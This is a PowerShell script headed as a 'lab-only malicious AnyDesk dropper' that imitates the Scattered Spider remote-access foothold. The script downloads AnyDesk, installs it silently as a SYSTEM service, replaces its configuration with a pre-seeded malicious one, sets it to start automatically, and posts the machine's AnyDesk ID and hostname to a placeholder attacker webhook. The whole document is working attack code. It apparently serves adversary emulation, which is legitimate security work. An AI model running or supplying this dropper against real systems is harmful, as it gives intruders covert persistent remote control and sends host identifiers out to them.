<#
Lab-Only Malicious AnyDesk Dropper
Simulates Scattered Spider RMM foothold stage
#>

# === CONFIG ===
$AnyDeskURL = "https://download.anydesk.com/AnyDesk.exe"  # Official source
$InstallerPath = "$env:TEMP\AnyDesk.exe"
$SystemConfPath = "C:\ProgramData\AnyDesk\system.conf"
$LocalConfPath = ".\system.conf"  # Pre-seeded malicious config
$WebhookURL = "https://your-webhook.site/abcd1234"  # Attacker webhook

# === STEP 1: Download AnyDesk Installer ===
Invoke-WebRequest -Uri $AnyDeskURL -OutFile $InstallerPath

# === STEP 2: Silent Install as SYSTEM Service ===
Start-Process -FilePath $InstallerPath -ArgumentList "/install /silent" -Verb RunAs -Wait

# === STEP 3: Replace Config with Malicious Pre-Seeded One ===
if (Test-Path $LocalConfPath) {
    Copy-Item $LocalConfPath $SystemConfPath -Force
} else {
    Write-Host "[!] system.conf not found in current directory. Aborting."
    exit
}

# === STEP 4: Start Service & Enable Auto-Start ===
Start-Service -Name AnyDesk
Set-Service -Name AnyDesk -StartupType Automatic

# === STEP 5: Retrieve AnyDesk ID ===
Start-Sleep -Seconds 5  # Wait for service to fully start
$AnyDeskCLI = "C:\Program Files (x86)\AnyDesk\AnyDesk.exe"
$AnyDeskID = & $AnyDeskCLI --get-id

# === STEP 6: Send ID to Attacker Webhook ===
try {
    Invoke-RestMethod -Uri $WebhookURL -Method POST -Body @{ ID = $AnyDeskID; Host = $env:COMPUTERNAME }
    Write-Host "[+] Sent AnyDesk ID $AnyDeskID to $WebhookURL"
} catch {
    Write-Host "[!] Failed to send to webhook."
}

Write-Host "[+] Malicious AnyDesk install complete. Ready for attacker connection."
